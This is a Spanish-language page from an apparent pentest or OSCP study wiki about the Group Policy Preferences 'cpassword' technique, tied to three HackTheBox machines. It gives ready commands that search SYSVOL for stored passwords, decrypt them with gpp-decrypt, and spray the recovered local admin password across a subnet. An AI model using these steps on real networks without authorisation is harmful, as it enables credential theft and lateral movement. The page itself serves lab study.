# Técnica: gpp

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**3 máquina(s)** mencionan esta técnica.

Alias buscados: `cpassword`, `group policy preferences`

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<DC_IP>` · `<DOMINIO>` · `<USER>`/`<PASS>`

### Qué es

**Group Policy Preferences** permitía a los administradores desplegar contraseñas
por GPO. Microsoft publicó la clave de cifrado, así que cualquiera las puede
descifrar. Sigue apareciendo en laboratorios y en redes reales sin limpiar.

Las contraseñas viven en `SYSVOL`, que **todo usuario del dominio puede leer**.

### Buscar — desde tu Kali

```bash
# Impacket
Get-GPPPassword.py '<DOMINIO>/<USER>':'<PASS>'@<DC_IP>

# NetExec
/usr/bin/nxc smb <DC_IP> -u '<USER>' -p '<PASS>' -M gpp_password
/usr/bin/nxc smb <DC_IP> -u '<USER>' -p '<PASS>' -M gpp_autologin

# Búsqueda cruda en el share
smbclient //<DC_IP>/SYSVOL -U '<USER>%<PASS>' -c 'recurse ON; prompt OFF; mget *'
grep -ri "cpassword" . 2>/dev/null
```

### Buscar — desde un host Windows

```cmd
findstr /S /I cpassword \\<DC>\sysvol\<dominio>\Policies\*.xml
type \\<DC>\sysvol\<dominio>\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
```

### Descifrar

El valor está en el atributo `cpassword`, cifrado con AES-256 y una clave
publicada por Microsoft. **No hace falta crackear nada**: se descifra.

```bash
# Impacket trae el descifrador
gpp-decrypt <CPASSWORD>

# O en Python, directo
python3 -c "
from impacket.examples import GetGPPPassword
print(GetGPPPassword.decrypt_gpp_password('<CPASSWORD>'))
"
```

### Qué más buscar en SYSVOL

`SYSVOL` es lectura para todos los usuarios del dominio, y suele tener más que
GPP:

```bash
# Scripts de inicio de sesión — a veces con credenciales hardcodeadas
ls -la \\\\<DC>\\sysvol\\<dominio>\\scripts\\

# Más políticas con credenciales
findstr /S /I "password passwd pwd" \\<DC>\sysvol\<dominio>\*.xml
findstr /S /I "password passwd pwd" \\<DC>\sysvol\<dominio>\*.ps1
findstr /S /I "password passwd pwd" \\<DC>\sysvol\<dominio>\*.bat
```

### Formato del hallazgo

```xml
<Groups>
  <User clsid="{...}" name="Administrator">
    <Properties
      cpassword="Vpe7Y6XaCfNlz8v6bGwZ2g"
      userName="Administrator"
      .../>
  </User>
</Groups>
```

Ese `cpassword` es todo lo que necesitás.

### Qué hacer con la contraseña

Es la contraseña del **Administrador local** de los equipos donde aplicaba la
GPO. Sospechá **reutilización**:

```bash
/usr/bin/nxc smb <IP> -u Administrator -p '<PASS>' --local-auth
/usr/bin/nxc smb <SUBRED> -u Administrator -p '<PASS>' --local-auth
```

Probala contra todas las máquinas del segmento: es una cuenta local, así que
tenés que usar `--local-auth`.

### Errores típicos

| Error | Causa |
| --- | --- |
| `Get-GPPPassword.py` no devuelve nada | Ya lo limpiaron, o no hay GPP en ese dominio |
| `Access denied` a SYSVOL | Tu usuario no es del dominio |
| El `cpassword` no descifra | Está corrupto o es de otra GPO |
| La contraseña no sirve para SMB | Suele ser de admin **local**: agregá `--local-auth` |

## Referencias

- [[WADComs|WADComs (espejo local)]] — https://wadcoms.github.io/

---

## Máquinas

- [[htb-active\|Active]] — 10 mención(es) · Windows · Easy
- [[htb-interactive\|htb-interactive]] — 6 mención(es)
- [[htb-querier\|Querier]] — 4 mención(es) · Windows · Medium

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'gpp' -v
python3 _sistema/herramientas/buscar.py 'gpp' -v --oscp
```
